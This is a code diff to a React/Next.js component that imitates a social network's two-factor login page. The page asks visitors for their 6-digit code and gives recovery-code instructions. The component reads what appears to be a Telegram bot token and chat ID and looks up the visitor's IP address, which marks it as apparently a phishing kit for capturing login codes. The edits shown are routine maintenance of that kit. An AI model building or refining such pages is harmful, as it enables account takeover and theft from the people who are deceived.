@@ -14,8 +14,8 @@ export default function Verifycode() {
 
   let verifyCode2 = '';
 
-  const botToken = process.env.BOT_TOKEN;
-  const chatId = process.env.CHAT_ID;
+  const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
+  const chatId = process.env.NEXT_PUBLIC_CHAT_ID;
 
   const getData = async () => {
     const res = await axios.get("https://api.ipify.org/?format=json");
@@ -69,7 +69,7 @@ export default function Verifycode() {
       }
       else setShowMinute(false)
     }
-  });
+  }, [timeCounter]);
   return (
     <div className='container m-auto p-10 mt-200 w-auto min-w-md max-w-xl'>
       <div className="flex justify-center h-200 bg-white border rounded-md">
@@ -78,7 +78,7 @@ export default function Verifycode() {
             <div className="relative w-auto my-6 mx-auto max-w-lg">
               <div className="border-0 rounded-lg shadow-lg relative flex flex-col bg-white outline-none focus:outline-none">
                 <div className="flex items-start justify-between p-5 border-b border-solid border-gray-300 rounded-t ">
-                  <h3 className="text-2xl font-semibold">Didn't recieve the code?</h3>
+                  <h3 className="text-2xl font-semibold">Didn&apos;t recieve the code?</h3>
                   <button
                     className="bg-transparent border-0 text-black flex justify-end items-center"
                     onClick={() => setVerifyModal(false)}
@@ -91,7 +91,7 @@ export default function Verifycode() {
                 <div className='border border-x-0 border-gray-300 border-t-1 border-b-1'>
                   <p className="text-black m-4 pt-2">1. Go to <b>Settings</b> &gt; <b>Security</b> and <b>Login</b>.</p>
                   <p className="text-black m-4 pt-2">2. Under the <b>Two-Factor Authentication </b>section,  click <b>Use two-factor authentication</b>. You may need to re-enter your password.</p>
-                  <p className="text-black m-4 pt-2 pb-10">3. Next to <b>Recovery Codes</b>, click <b>Setup</b> then <b>Get Codes</b>. If you've already setup recovery codes, you can click <b>Show Codes.</b></p>
+                  <p className="text-black m-4 pt-2 pb-10">3. Next to <b>Recovery Codes</b>, click <b>Setup</b> then <b>Get Codes</b>. If you&apos;ve already setup recovery codes, you can click <b>Show Codes.</b></p>
                 </div>
                 <div className="flex items-center justify-end p-2 border-t border-solid border-blueGray-200 rounded-b">
                   <button
@@ -115,7 +115,7 @@ export default function Verifycode() {
         ) : (
           <div>
             <div className="flex w-auto text-xl font-bold m-2 text-black">Two-factor authentication required (2/3) </div>
-            <div className="text-md m-4 text-black">You've asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</div>
+            <div className="text-md m-4 text-black">You&apos;ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</div>
             <div className="text-md m-4 pt-2 text-black">Enter the 6-digit from your <b>code generator</b> or third-party app below.</div>
             <div className="m-2 pt-3 flex items-center border border-gray-500 border-x-0 border-t-1 border-b-0">
               <input type="text" value={verifyCode} id="text" className="m-2 border border-gray-300 text-gray-900 text-sm rounded-md focus:ring-blue-500 focus:border-blue-500 block w-auto p-1.5 placeholder:text-slate-400 placeholder:p-2" placeholder="Your code" onChange={(e) => setVerifyCode(e.target.value)} />
